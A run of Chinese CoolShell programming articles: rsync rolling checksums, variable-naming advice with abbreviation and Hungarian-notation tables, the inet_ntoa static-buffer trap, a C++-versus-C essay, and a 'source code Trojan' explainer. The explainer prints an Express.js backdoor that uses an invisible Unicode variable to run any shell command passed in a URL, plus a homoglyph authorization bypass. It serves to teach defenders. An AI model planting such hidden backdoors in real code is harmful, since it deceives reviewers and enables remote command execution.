而是直接计算：`(12345 - 1 * 10^4) * 10 + 6 * 10 ^0`我们可以看到，其中，我们把12345最左边第一位去掉，然后，再加上最右边的一位。这就是Rolling checksum的算法。实际的公式是：`hash ( t[0, m-1] ) = t[0] * b^(m-1) + t[1] * b^[m-2] ..... t[m-1] * b^0`其中的 b是一个常数基数，在 Rabin-Karp 算法中，我们一般取值为 256。于是，在计算 hash ( t[1, m] ) 时，只需要下面这样就可以了：`hash( t[1, m] ) = hash ( t[0, m-1] ) - t[0] * b^(m-1) + t[m] * b ^0`#### 图示怎么，你没看懂？ 好吧，我送佛送上西，画个示意图给你看看（对图中的东西我就不再解释了）。这样，最终，在同步源这端，我们的rsync算法可能会得到下面这个样子的一个数据数组，图中，红色块表示在目标端已匹配上，不用传输（注：我专门在其中显示了两块chunk #5，相信你会懂的），而白色的地方就是需要传输的内容（注意：这些白色的块是不定长的），这样，同步源这端把这个数组（白色的就是实际内容，红色的就放一个标号）压缩传到目的端，在目的端的rsync会根据这个表重新生成文件，这样，同步完成。
最后想说一下，对于某些压缩文件使用rsync传输可能会传得更多，因为被压缩后的文件可能会非常的不同。对此，对于gzip和bzip2这样的命令，记得开启 “rsyncalbe” 模式。（全文完， **转载时请注明作者和出处** ）# 编程命名中的7+1个提示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn前几天Neo写过《编程中的命名设计那点事》，这里也有另外一篇和程序命名的文章，可以从另一个角度看看。**1.- 变量应该是尽可能的望文知意。千万不要使用教材中的命名方式。*** **好的变量** ： **** daysDateRange, flightNumber, carColor.   * **坏的变量** ： days, dRange, temp, data, aux…在我们的日常工作中，有很大数量的开发人员喜欢使用短的变量名，而不是有含义的变量名。这主要是因为我们大学教科书的那些示例所造成的，人都是先入为主，所以，教科书中的那些很抽象，带着演示的变量命名影响了我们一代又一代的程序员，并影响了他们很多年。虽然那些短的，教材式的变量名，可能会让你少打一些字，但其实，这是非常非常不好的。因为软件的维护成本远远大于了软件的开发成本，如果你不取一个好的一点的变量名，那么当进行代码评审时，当进行bug fixing时，当进行代码重构时，当进行代码维护时，你的某个变量名可能会让你一头雾水，不知道所措，还可以会让你走入陷阱，造成更大的时间成本。所以，一个可阅读的代码必然和那些不错的变量名分不开，而这也能让你的软件间接上有更好的质量。
**2.- 变量名不要太长，尽可能地简短**只有简单和简短的变量名才是容易阅读的。因为你的变量名一定会用于程序语句中，所以，为了让你的程序语句看起来的简短，你的变量名也应该短一点，不然写出来的一个表达式就会显得很复杂。当然，在有些时候，一个有含义的变量名和一个简短的变量名可能存在一些冲突。这相当锻炼我们的语言能力——如果有最精炼的词语来表达最丰富的含义。如果实在做不到，那么，取一个有含义的变量名要比取一个简短的变量名更好一些。不管怎么样，我们希望即简短又有丰富的含义，但如果不能两全，那有含义优先级更高一些。* **坏的变量** ：howLonDoesItTakeToOpenTheDoor， howBigIsTheMaterial…   * **好的变量** ：timeToOpenTheDoor， MaterialSize.**3.- 可以使用缩写，但需要有一些注释**有一些时候，我们需要使用一些缩写来命名变量，比如：用usr来表示user，用gp来表示group，用conf来表示configuration，用cwd来表示current working directory，用ptr来代码point to reference，等等，等等。缩写一般要用在大家可以看得懂的，而不是为了缩写而缩短一个单词，当然，如果你把缩写后的变量名加上注释，那就更加稳妥了。关于一些约定俗成的缩写，可参看本文的 **附录一** 。
**4.- 使用合适的匈牙利命名规则**这里有一篇非常不错的英文文章告诉你 《什么是合适的匈牙利命名 》，这篇文章同时还告诉你如何去用他。基本上来说，匈牙利命名法主要是为变量加上某种前缀以标识这个变量的类型，或是一种方法的功能。其基本原则是：变量名＝属性＋类型＋对象描述。比如：在描述类型方面：指针p，函数fn，长整型 l，布尔b，浮点型（有时也指文件）f，双字 dw，字符串 sz，短整型 n，双精度浮点 d，无符号 u……等等。关于更多的命名规范，请参见 **附录二** 。注意，匈牙利命名也是有不好的地方的，比如你要把一个整形改成一个浮点型，你除了要改变这个变量的类型，你还要改变这个变量的名字。这是相当麻烦的。而且，在某些时候，这种前缀式的命名可以反而让你不知所措。另外，在C++中，有了类以后，这种命名方法就显得不容易去实施了。所以，合适地使用匈牙利命名方式背后的思想是很关键的。**5.- 不要使用反逻辑来命名*** **好的命名** ： IsEnabled.   * **坏的命名：** IsNotEnabled.在阅读的时候，我们更喜欢正向的逻辑，而不是反向逻辑。这一规则不单单的命名，在条件语句中，我们也是要尽量不要使用这种反面的逻辑。如：if (! (isAdmin || isUser))，这样的语句很不符合人读代码的习惯，写成这样会更好一些——if (!isAdmin && !isUser)。
**6.- 保持一致性**保持所有代码的一致性。使用相同的命名规则。这外世界上没有最好的命名规范。但有一点是可以确认的，那就是在一个代码库中，应该使用一致的命名规则，即使这个规则不那么好，但整个团队使用一致的就是好的。**7.- 附和应用程序的领域术语**在不同的领域中，不同的观念会有非常特别和不同的意思。例如：单词“order”并不总是意味着“次顺”，有些时候，其意味着“订单”，有些时候，意味着“命令”，有些时候，意为着“规则”。所以，在某个领域中，某些单词会有不同的含义，所以，这需要我们的命令去附和这些领域。**黄金法则- 花一些时间去思考去权衡一下你的变量名**当你设计好一个的变量名一个函数名的时候，别着急去使用他，停下来，想一想，这个变量名是否合适，是否还有更好的？也许你正在使用的是一个很不好的变量名。有些时候，需要我们权衡利弊一下，可能还要去和同事讨论一下。总之，变量名是编程的第一步，第一步走好了，后面才走得好。试想，无论是你或你的同事在使用一些好的变量名编程是一件多么轻松的事啊。#### 附录：部分的缩写规范完整单词 | 缩写   ---|---   A |   average | avg   B |   back | bk   background | bg   break | brk   buffer | buf   C |   color | cr,clr   control | ctrl   D |   data | dat   delete | del   document | doc   E |   edit | edt   error | err   escape | esc   F |   flag | flg   form | frm   G |   grid | grd   I |   increment | inc   information | info   initial | init   insert | ins   image | img   L |   lable | lab   length | len   list | lst   library | lib   M |   manager | mgr,mngr   message | msg   O |   Oracle | Ora   P |   panorama | pano   password | pwd   picture | pic   point | pt   position | pos   print | prn   program | prg   S |   server | srv   source | src   statistic | stat   string | str   Sybase | Syb   T |   temp | tmp   text | txt   U |   user | usr   W |   window | win,wnd
#### 附录二、匈牙利命名法a       Array                       数组     b       BOOL (int)                  布尔(整数)     by      Unsigned Char (Byte)        无符号字符(字节)     c       Char                        字符(字节)     cb      Count of bytes              字节数     cr      Color reference value       颜色(参考)值     cx      Count of x (Short)          x的集合(短整数)     dw      DWORD   (unsigned long)     双字(无符号长整数)     f       Flags                       标志(一般是有多位的数值)     fn      Function                    函数     g_      global                      全局的     h       Handle                      句柄     i       Integer                     整数     l       Long                        长整数     lp      Long pointer                长指针     m_      Data member of a class      一个类的数据成员     n       Short int                   短整数     p       Pointer                     指针     s       String                      字符串     sz      Zero terminated String      以0结尾的字符串     tm      Text metric                 文本规则     u       Unsigned int                无符号整数     ul      Unsigned long (ULONG)       无符号长整数     w       WORD (unsigned short)       无符号短整数     x,y     x, y coordinates (short)    坐标值/短整数     v       void                        空
有关项目的全局变量用g_开始，类成员变量用m_，局部变量若函数较大则可考虑用l_用以显示说明其是局部变量。前缀       类型        例子     g_      全局变量       g_Servers     C       类或者结构体   CDocument，CPrintInfo     m_      成员变量       m_pDoc，m_nCustomers**VC常用前缀列表：**前缀   类型   描述                      例子     ch     char    8位字符                   chGrade     ch     TCHAR   16位UNICODE类型字符       chName     b      BOOL    布尔变量                  bEnabled     n      int     整型                      nLength     n      UINT    无符号整型                nLength     w      WORD    16位无符号整型            wPos     l      LONG    32位有符号整型            lOffset     dw     DWORD   32位无符号整型            dwRange     p      *       内存模块指针，指针变量   pDoc     lp     FAR*    长指针                    lpDoc     lpsz   LPSTR   32位字符串指针           lpszName     lpsz   LPCSTR  32位常量字符串指针       lpszName     lpsz   LPCTSTR 32位UNICODE类型常量指针  lpszName     h      handle  Windows对象句柄           hWnd     lpfn   (*fn)() 回调函数指针              lpfnAbort
**Windows对象名称缩写：**Windows对象 例子变量  MFC类       例子对象     HWND        hWnd;      CWnd*       pWnd;     HDLG        hDlg;      CDialog*    pDlg;     HDC         hDC;       CDC*        pDC;     HGDIOBJ     hGdiObj;   CGdiObject* pGdiObj;     HPEN        hPen;      CPen*       pPen;     HBRUSH      hBrush;    CBrush*     pBrush;     HFONT       hFont;     CFont*      pFont;     HBITMAP     hBitmap;   CBitmap*    pBitmap;     HPALETTE    hPalette;  CPalette*   pPalette;     HRGN        hRgn;      CRgn*       pRgn;     HMENU       hMenu;     CMenu*      pMenu;     HWND        hCtl;      CStatic*    pStatic;     HWND        hCtl;      CButton*    pBtn;     HWND        hCtl;      CEdit*      pEdit;     HWND        hCtl;      CListBox*   pListBox;     HWND        hCtl;      CComboBox*  pComboBox;
（全文完）# 源代码特洛伊木马攻击作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi- direction。术语通常缩写为“ **BiDi** ”或“ **bidi** ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过ISO/IEC 8859-6和ISO/IEC 8859-8等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。
双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“关于双向Unicode的警告”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。package mainimport "fmt"func main() {     str, mask := "Hello, World!‮10x‭", 0这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行 – https://play.golang.org/p/e2BDZvFlet0），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？
如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。其中有两个浅蓝色的尖括号的东西—— `<202e>` 和 `<202d>` 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 Unicode Bidirectional Classes）：* **U+202E – Right-to-Left Override [RLO]**   表示，开始从右到左显示，于是，接下来的文本 `10x", 0` 变成了 `0 ,"x01`* **U+202D – Left-to-Right Override [LRO]**   表示，开始从左到右显示，于是，`0,"x01` 中的前4个字符`0 ,"` 反转成 `", 0`，于是整个文本成了 `", 0x01`所以，你在视觉上看到的是结果是—— `"Hello, World!”, 0x01`， 但是实际上是完全是另外一码事。然后，Github官方博客中还给了一个安全问题 CVE-2021-42574 ——> 在 Unicode 规范到 14.0 > 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 > Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。
这个安全问题在剑桥大学的这篇论文“Some Vulnerabilities are Invisible”中有详细的描述。其中PDF版的文章中也给了这么一个示例：通过双向文本可以把下面这段代码：伪装成下面的这个样子：在图 2 中`'alice'`被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入 **RLI (Right To Left Isolate)** _–_ **U+2067** _，_ 我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“The Invisible Javascript Backdoor”里的这个示例：const express = require('express');     const util = require('util');     const exec = util.promisify(require('child_process').exec);
const app = express();app.get('/network_health', async (req, res) => {     const { timeout,ㅤ} = req.query;     const checkCommands = [     'ping -c 1 google.com',     'curl -s http://example.com/',ㅤ     ];app.listen(8080);上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 `ping -c 1 google.com` 以及 `curl -s http://example.com` 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数`timeout`限制命令执行时间。然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了于是，一个你看不见的 `πàñ` 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：
**http://host:port/network_health?%E3%85%A4= <any command>**其中的，%E3%85%A4 就是 `\u3164` 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。另外，还可以使用“同形字符”，看看下面这个示例：if(environmentǃ=ENV_PROD){     // bypass authZ checks in DEV     return true;     }如何你以为 `ǃ` 是 惊叹号，其实不是，它是一个Unicode `╟â`。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。现在，是时候检查一下你的代码有没有上述的这些情况了……（全文完）# C/C++返回内部静态成员的陷阱作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在我们用C/C++开发的过程中，总是有一个问题会给我们带来苦恼。这个问题就是函数内和函数外代码需要通过一块内存来交互（比如，函数返回字符串），这个问题困扰和很多开发人员。如果你的内存是在函数内栈上分配的，那么这个内存会随着函数的返回而被弹栈释放，所以，你一定要返回一块函数外部还有效的内存。
这是一个让无数人困扰的问题。如果你一不小心，你就很有可能在这个上面犯错误。当然目前有很多解决方法，如果你熟悉一些标准库的话，你可以看到许多各式各样的解决方法。大体来说有下面几种：1）在函数内部通过malloc或new在堆上分配内存，然后把这块内存返回（因为在堆上分配的内存是全局可见的）。这样带来的问题就是潜在的内存问题。因为，如果返回出去的内存不释放，那么就是memory Leak。或者是被多次释放，从而造成程序的crash。这两个问题都相当的严重，所以这种设计方法并不推荐。（在一些Windows API中，当你调用了一些API后，你必需也要调用他的某些API来释放这块内存）2）让用户传入一块他自己的内存地址，而在函数中把要返回的内存放到这块内存中。这是一个目前普遍使用的方式。很多Windows API函数或是标准C函数都需要你传入一个buffer和这个buffer的长度。这种方式对我们来说应该是屡见不鲜了。这种方式的好处就是由函数外部的程序来维护这块内存，比较简显直观。但问题就是在使用上稍许有些麻烦。不过这种方式把犯错误的机率减到了最低。3）第三种方式显得比较另类，他利用了static的特性，static的栈内存一旦分配，那这块内存不会随着函数的返回而释放，而且，它是全局可见的（只要你有这块内存的地址）。所以，有一些函数使用了static的这个特性，即不用使用堆上的内存，也不需要用户传入一个buffer和其长度。从而，使用得自己的函数长得很漂亮，也很容易使用。
这里，我想对第三个方法进行一些讨论。使用static内存这个方法看似不错，但是它有让你想象不到的陷阱。让我们来用一个实际发生的案例来举一个例子吧。#### **示例**有过socket编程经验的人一定知道一个函数叫：inet_ntoa，这个函数主要的功能是把一个数字型的IP地址转成字符串，这个函数的定义是这样的（注意它的返回值）：**char *inet_ntoa(struct in_addr in);**显然，这个函数不会分配堆上的内存，而他又没有让你传一下字符串的buffer进入，那么他一定使用“返回static char[]”这种方法。在我们继续我们的讨论之前，让我们先了解一下IP地址相关的知识，下面是inet_ntoa这个函数需要传入的参数：（也许你会很奇怪，只有一个member的struct还要放在struct中干什么？这应该是为了程序日后的扩展性的考虑）**struct in_addr {   unsigned long int s_addr;   }   **   对于IPV4来说，一个IP地址由四个8位的bit组成，其放在s_addr中，高位在后，这是为了方便网络传输。如果你得到的一个s_addr的整型值是：3776385196。那么，打开你的Windows计算器吧，看看它的二进制是什么？让我们从右到左，8位为一组（如下所示）。
11100001 00010111 00010000 10101100再把每一组转成十进制，于是我们就得到：225 23 16 172， 于是IP地址就是 172.16.23.225。好了，言归正传。我们有这样一个程序，想记录网络包的源地址和目地地址，于是，我们有如下的代码：struct in_addr src, des;     ........     ........     fprintf(fp, "源IP地址<%s>/t目的IP地址<%s>/n", inet_ntoa(src),   inet_ntoa(des));会发生什么样的结果呢？你会发现记录到文件中的源IP地址和目的IP地址完全一样。这是什么问题呢？于是你开始调试你的程序，你发现src.s_addr和des.s_addr根本不一样（如下所示）。可为什么输出到文件的源和目的都是一样的？难道说是inet_ntoa的bug？src.s_addr = 3776385196;    //对应于172.16.23.225     des.s_addr = 1678184620;  //对应于172.16.7.100原因就是inet_ntoa()“自作聪明”地把内部的static char[]返回了，而我们的程序正是踩中了这个陷阱。让我们来分析一下fprintf代码。在我们fprintf时，编译器先计算inet_ntoa(des)，于是其返回一个字符串的地址，然后程序再去求inet_ntoa(src)表达式，又得到一个字符串的地址。这两个字符串的地址都是inet_ntoa()中那个static char[]，显然是同一个地址，而第二次求src的IP时，这个值的des的IP地址内容必将被src的IP覆盖。所以，这两个表达式的字符串内存都是一样的了，此时，程序会调用fprintf把这两个字符串（其实是一个）输出到文件。所以，得到相同的结果也就不奇怪。
仔细看一下inet_ntoa的man，我们可以看到这句话： **The string is returned in a statically allocated buffer, which subsequent calls will overwrite.** 证实了我们的分析。#### **小结**让我们大家都扪心自问一下，我们在写程序的过程当中是否使用了这种方法？这是一个比较危险，容易出错的方法。这种陷阱让人防不胜防。想想，如果你有这样的程序：if ( strcmp( inet_ntoa(ip1), inet_ntoa(ip2) )==0 ) {   …. ….   }本想判断一下两个IP地址是否一样，却不料掉入了那个陷阱——让这个条件表达式永真。这个事情告诉我们下面几个道理：1）慎用这种方式的设计。返回函数内部的static内存有很大的陷阱。   2）如果一定要使用这种方式的话。你就必须严肃地告诉所有使用这个函数的人，千万不要在一个表达式中多次使用这个函数。而且，还要告诉他们，不copy函数返回的内存的内容，而只是保存返回的内存地址或是引用是没用的。不然的话，后果概不负责。   3）C/C++是很危险的世界，如果你不清楚他的话。还是回火星去吧。
附：看过Efftive C++的朋友一定知道其中有一个条款（item 23）：不要试图返回对象的引用。这个条款中也对是否返回函数内部的static变量进行了讨论。结果也是持否定态度的。(全文完)# C++的坑真的多吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn先说明一下，我不希望本文变成语言争论贴。希望下面的文章能让我们客观理性地了解C++这个语言。（另，我觉得技术争论不要停留在非黑即白的二元价值观上，这样争论无非就是比谁的嗓门大，比哪一方的观点强，毫无价值。我们应该多看看技术是怎么演进的，怎么取舍的。）目录* 事由   * C++真的比C差吗？   * C++的坑有多少？   * C++的初衷   * 我对C++的感情   * C++的未来   * 总结#### 事由周五的时候，我在我的微博上发了一个贴说了一下一个网友给我发来的C++程序的规范和内存管理写的不是很好（后来我删除了，因为当事人要求），我并非批判，只是想说明其实程序员是需要一些“疫苗”的，并以此想开一个“程序员疫苗的网站”，结果，@简悦云风同学直接回复到：“ **不要用 C++ 直接用 C , 就没那么多坑了。** ”就把这个事带入了语言之争。
我又发了一条微博：@左耳朵耗子 !新浪个人认证 ： 说C++比C的坑更多的人我可以理解，但理性地思考一下。C语言的坑也不少啊，如果说C语言有90个坑，那么C++就是100个坑（另， **我看很多人都把C语言上的坑也归到了C++上来** ），但是C++你得到的东西更多，封装，多态，继承扩展，泛型编程，智能指针，……，你得到了500%东西，但却只多了10%的坑，多值啊。结果引来了更多的回复（只节选了一些言论）：* @淘宝褚霸也在微博里说：“自从5年前果断扔掉C++，改用了ansi c后，我的生活质量大大提升，没有各种坑坑我。”* @Laruence在其微博里说: “我确实用不到, C语言灵活运用struct, 可以很好的满足这些需求.//@左耳朵耗子: 封装，继承，多态，模板，智能指针，这也用不到？这也学院派？//@Laruence: 问题是, 这些东西我都用不到… C语言是工程师搞的, C++是学院派搞的”**那么，C++的坑真的多么？我还请大家理性地思考一下** 。#### C++真的比C差吗？我们先来看一个图——《各种程序员的嘴脏的对比》，从这个图上看，C程序员比C++的程序员在注释中使用fuck的字眼多一倍。这说明了什么？ **我个人觉得这说明C程序员没有C++程序员淡定** 。
!Google Code 中程序语言出现 fuck 一词的比率不要太纠结上图，只是轻松一下，我没那么无聊，让我们来看点真正的论据。相信用过C++的程序员知道，C++的很多特性主要就是解决C语言中的各种不完美和缺陷：（注： **C89、C99中许多的改进正是从C++中所引进的** ）* 用namespace解决了很C函数重名的问题。* 用const/inline/template代替了宏，解决了C语言中宏的各种坑。* 用const的类型解决了很多C语言中变量值莫名改变的问题。* 用引用代替指针，解决了C语言中指针的各种坑。这个在Java里得到彻底地体现。* 用强类型检查和四种转型，解决了C语言中乱转型的各种坑。* 用封装（构造，析构，拷贝构造，赋值重载）解决了C语言中各种复制一个结构体（struct）或是一个数据结构（link, hashtable, list, array等）中浅拷贝的内存问题的各种坑。* 用封装让你可以在成员变量加入getter/setter，而不会像C一样只有文件级的封装。* 用函数重载、函数默认参数，解决了C中扩展一个函数搞出来像func2()之类的ugly的东西。
* 用继承多态和RTTI解决了C中乱转struct指针和使用函数指针的诸多让代码ugly的问题。* 用RAII，智能指针的方式，解决了C语言中因为出现需要释放资源的那些非常ugly的代码的问题。* 用OO和GP解决各种C语言中用函数指针，对指针乱转型，及一大砣if-else搞出来的ugly的泛型。* 用STL解决了C语言中算法和数据结构的N多种坑。（注意：上面我没有提重载运算符和异常，前者写出来的代码并不易读和易维护（参看《恐怖的C++语言》后面的那个示例），坑也多，后者并不成熟（相对于Java的异常），但是我们需要知道try- catch这种方式比传统的不断地判断函数返回值和errno形成的大量的if-else在代码可读性上要好很多）上述的这些东西填了不知有多少的C语言编程和维护的坑。 **少用指针，多用引用，试试autoptr，用用封装，继承，多态和函数重载…… 你面对的坑只会比C少，不会多。**#### C++的坑有多少？C++的坑真的不多，如果你能花两到三周的时候读一下《Effecitve C++》里的那50多个条款，你就知道C++里的坑并不多，而且，有很多条款告诉我们C++是怎么解决C的坑的。然后，你可以读读《Exceptional C++》和《More Exceptional C++》，你可以了解一下C++各种问题的解决方法和一些常见的经典错误。
当然，C++在解决了很多C语的坑的同时，也因为OO和泛型又引入了一些坑。消一些，加一些，我个人感觉上总体上只比C多10%左右吧。但是你有了开发速度更快，代码更易读，更易维护的500%的利益。另外，不可否认的是，C++中的代码出了错误，有时候很难搞，而且似乎用C++的人会觉得C++更容易出错？我觉得主要是下面几个原因：* **C和C++都没学好，大多数人用C++写C，所以，C的坑和C++的坑合并了。*** ****C++太灵活了，想怎么搞就怎么搞，所以，各种不经意地滥用和乱搞。****另外，C++的编译对标准C++的实现各异，支持地也千差万别，所以会有一些比较奇怪的问题，但是如果你一般用用C++的封装，继承，多态，以及namespace，const, refernece, inline, templete, overloap, autoptr，还有一些OO 模式，并不会出现奇怪的问题。而对于STL中的各种坑，我觉得是程序员们还对GP（泛型编程）理解得还不够，STL是泛型编程的顶级实践！属于是大师级的作品，一般人很难理解。必需承认STL写出来的代码和编译错误的确相当复杂晦涩，太难懂了。这也是C++的一个诟病。
这和Linus说的一样 —— “ **C++是一门很恐怖的语言，而比它更恐怖的是 很多不合格的程序员在使用着它**”。注意我飘红了“ **很多不合格的程序员** ”！我觉得C++并不适合初级程序员使用，C++只适合高级程序员使用（参看《21天学好C++》和《C++学习自信心曲线》），正如《Why C++》中说的，C++适合那些对开发维护效率和系统性能同时关注的高级程序员使用。**这就好像飞机一样，开飞机很难，开飞机要注意的东西太多太多，对驾驶员的要求很高，但你不能说飞机这个工具很烂，开飞机的坑太多。** （注：我这里并不是说C++是飞机，C是汽车，C++和C的差距，比飞机到汽车的差距少太多太多，这里主要是类比，我们对待C++语言的心态！）#### C++的初衷理解C++设计的最佳读本是《C++演化和设计》，在这本书中Stroustrup说了些事：1）Stroustrup对C是非常欣赏， **实际上早期C++许多的工作是对于C的强化和净化** ，并把完全兼容C作为强制性要求。C89、C99中许多的改进正是从C++中所引进。可见，Stroustrup对C语言的贡献非常之大。 **今天不管你对C++怎么看，C++的确扩展和进化了C，对C造成了深远的影响** 。
2）Stroustrup对于C的抱怨主要来源于两个方面——在C++兼容C的过程中遇到了不少设计实现上的麻烦；以及守旧的K&R C程序员对Stroustrup的批评。 **很多人说C++的恶梦就是要去兼容于C，这并不无道理（** Java就干的比C++彻底得多 **）** ，但这并不是Stroustrup考虑的，Stroustrup一边在使尽浑身解数来兼容C，另一方面在拼命地优化C。3）Stroustrup在书中直接说，C++最大的竞争对手正是C，他的目的就是—— **C能做到的，C++也必须做到，而且要做的更好** 。大家觉得是不是做到了？有多少做到了，有多少还没有做到？4）对于同时关注的运行效率和开发效率的程序员，Stroustrup多次强调C++的目标是——“ **在保证效率与C语言相当的情况下，加强程序的组织性；能保证同样功能的程序，C++更短小** ”， **这正是 浅封装的核心思想**。而不是过渡设计的OO。（参看：面向对象是个骗局）5）这本书中举了很多例子来回应那些批评C++有运行性能问题的人。C++在其第二个版本中，引入了虚函数机制，这是C++效率最大的瓶颈了，但我个人认为虚函数就是多了一次加法运算，但让我们的代码能有更好的组织，极大增加了程序的阅读和降底了维护成本。（注：Lippman的《深入探索C++对象模型》也说明了C++不比C的程序在运行性能低。Bruce的《Think in C++》也说C++和C的性能相差只有5%）
6）这本书中还讲了一些C++的痛苦的取舍，印象最深的就是多重继承，提出，拿掉，再被提出，反复很多次，大家在得与失中不断地辩论和取舍。这个过程让我最大的收获是——a) **对于任何一种设计都有好有坏，都只能偏重一方** ，b) **完全否定式的批评是不好的心态，好的心态应该是建设性地批评** 。#### 我对C++的感情我先说说我学C++的经历。我毕业时，是直接从C跳过C++学Java的，但是 **学Java的时候，不知道为什么Java要设计成这样，只好回头看C++，结果学C++的时候又有很多不懂，又只得回头看C** ， **最后发现，C - > C++ -> Java的过程，就是C++填C的坑，Java填C++的坑的过程**。注，下面这些东西可以看到Java在填C/C++坑：* Java彻底废弃了指针（指针这个东西，绝对让这个社会有几百亿的损失），使用引用。   * Java用GC解决了C++的各种内存问题的诟病，当然也带来了GC的问题，不过功大于过。   * Java对异常的支持比C++更严格，让编程更方便了。   * Java没有像C++那样的template/macro/函数对象/操作符重载，泛型太晦涩，用OO更容易一些。   * Java改进了C++的构造、析构、拷贝构造、赋值。   * Java对完全抛弃了C/C++这种面向过程的编程方式，并废弃了多重继承，更OO（如：用接口来代替多重继承）   * Java比较彻底地解决了C/C++自称多年的跨平台技术。   * Java的反射机制把这个语言提升了一个高度，在这个上面可以构建各种高级用法。   * C/C++没有一些比较好的类库，比如UI，线程 ，I/O，字符串处理等。（C++0x补充了一些）   * 等等……
当然时代还在前进，这个演变的过程还在C#和Go上体现着。不过我学习了C -> C++ -> Java这个填坑演进的过程，让我明白了很多东西：* 我明白了OO是怎么一回事，重要的是明白了OO的封装，继承，和多态是怎么实现的。（参看我以前写过的《C++虚函数表解析》和《C++对象内存布局》）   * 我明白了STL的泛型编程和Java的各种花哨的技术是怎么一回事，以及那些很花哨的编程方法和技术。   * 我明白了C，C++，Java的各中坑，这就好像玩火一样，我知道怎么玩火不会烧身了。**我从这个学习过程中得到的最大的收获不是语言本身，而是各式各样的编程技术和方法，和技术的演进的过程，这比语言本身更重要** ！（ **在这个角度上学习，你看到的不是一个又一个的坑，你看到的是——各式各样让你可以爬得更高的梯子** ）我对C++的感情有三个过程：先是喜欢地要死，然后是恨地要死，现在的又爱又恨，爱的是这个语言，恨的是很多不合格的人在滥用和凌辱它。#### C++的未来C++语言发展大概可以分为三个阶段（摘自Wikipedia）：* 第一阶段从80年代到1995年。这一阶段C++语言基本上是传统类型上的面向对象语言，并且凭借著接近C语言的效率，在工业界使用的开发语言中占据了相当大份额；   * 第二阶段从1995年到2000年，这一阶段由于标准模板库（STL）和后来的Boost等程式库的出现，泛型程式设计在C++中占据了越来越多的比重性。当然，同时由于Java、C#等语言的出现和硬件价格的大规模下降，C++受到了一定的冲击；   * 第三阶段从2000年至今，由于以Loki、MPL等程式库为代表的产生式编程和模板元编程的出现，C++出现了发展历史上又一个新的高峰，这些新技术的出现以及和原有技术的融合，使C++已经成为当今主流程式设计语言中最复杂的一员。
在《Why C++? 王者归来》中说了 ，性能主要就是要省电，省电就是省钱，在数据中心还不明显，在手机上就更明显了，这就是为什么Android 支持C++的原因。所以，在NB的电池或是能源出现之前， **如果你需要注重程序的运行性能和开发效率，并更关注程序的运性能，那么，应该首选 C++** 。这就是iOS开发也支持C++的原因。今天的C++11中不但有更多更不错的东西，而且，还填了更多原来C++的坑。（参看：C++11 Wiki，C++ 11的主要特性）#### **总结*** **C++并不完美，但学C++必然让你受益无穷。*** **是那些不合格的、想对编程速成的程序员让C++变得坑多。**最后，非常感谢能和“ **@简悦云风** ”，“ **@淘宝诸霸** ”，“ **@Laruence** ”一起讨论这个问题！无论你们的观点怎么样，我都和你们“在一起”，嘿嘿嘿……(全文完)# 如果你看不见你还能编程吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这是个StackOverflow上的问题 How can you program if you’re blind? 。在看到这个问题的时候，我感到应该不可能，但是我错了，这个问题的前两个答案让我深深地震憾了。
